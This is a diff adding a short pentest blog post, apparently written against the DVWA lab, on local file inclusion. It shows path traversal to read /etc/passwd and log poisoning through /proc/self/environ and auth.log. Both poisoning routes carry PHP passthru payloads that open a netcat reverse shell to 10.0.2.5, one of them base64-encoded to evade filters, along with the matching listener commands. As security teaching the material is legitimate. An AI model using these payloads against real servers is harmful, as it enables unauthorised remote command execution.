@@ -1,0 +1,43 @@
++++
+categories = ["Pentest", "Web"]
+date = "2021-02-06"
+title = "Vulnerability Local File Inclusion"
+type = ["posts","post"]
+[ author ]
+  name = "nazori"
++++
+
+## Get the file 
+
+If you see a web in which the URL it's something like `/?page=something.php`, we can try to exploit it.
+
+1. First we remove the `?page=` and reload to get the path to the file in the new url.
+2. Copy the path in the old url like this `/?page=/var/www/dvwa/vulerabilities/fi/something.php`.
+3. If this new url loads correctly, we can exploit it by replacing every directory for `..`.
+4. So we end with something like this `/?page=/../../../../../etc/passwd`.
+
+This way we can access some local file that is in the server, but it wasn't suposed to be accessible.
+
+
+## Reverse Shell - environ
+
+Setting the burp proxy on we reload `/?page=/../../../../../proc/self/environ` we can do two things.
+
+* Replace User-Agent field for `<?phpinfo();?>` to get the interpreter info.
+* Replace for `<?passthru('nc -e /bin/sh 10.0.2.5 8888 ');?>`. In a terminal listen to that por with this command `nc -vv -l -p 8888`. Reload, and get a reverse shell on your terminal.
+
+
+## Reverse Shell - auth.log
+
+1. First we try to see if we can  get the auth.log with the url `/?page=/../../../../../var/log/auth.log`.
+2. We are going to try a connection by ssh with the server and see if it gets register on the auth.log. We use any user name `ssh random@10.0.2.4`.
+3. If it is the case, now we do another ssh connection but this time the username is going to be a script.
+``` 
+>ssh "<?passthru('nc -e /bin/sh 10.0.2.5 9999 ');?>"@10.0.2.4
+```
+4. To avoid the filters we are goint to encode the script using the burp proxy. We can use base64 and the script would result in something like 
+
+``` 
+>ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4wLjIuNSA5OTk5'));?>"@10.0.2.4
+```
+5. Now in other terminal we just have to listen to the port as in the previous example `nc -vv -l -p 9999`
